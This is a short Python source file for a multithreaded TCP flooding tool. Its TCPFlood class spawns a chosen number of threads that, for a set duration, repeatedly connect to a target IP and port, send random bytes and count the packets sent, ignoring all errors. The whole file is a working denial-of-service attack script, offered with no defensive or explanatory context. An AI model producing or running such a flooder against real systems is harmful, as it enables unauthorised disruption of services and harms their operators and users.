import socket
import random
import threading
import time

class TCPFlood:
    def __init__(self):
        self.packet_count = 0
    
    def launch(self, target_ip, target_port, duration, threads):
        def flood():
            end_time = time.time() + duration
            while time.time() < end_time:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(0.1)
                    sock.connect((target_ip, target_port))
                    sock.send(random._urandom(1024))
                    self.packet_count += 1
                    sock.close()
                except:
                    pass
        
        worker_threads = []
        for _ in range(threads):
            t = threading.Thread(target=flood)
            t.daemon = True
            t.start()
            worker_threads.append(t)
        
        for t in worker_threads:
            t.join(timeout=duration)
        
        return self.packet_count
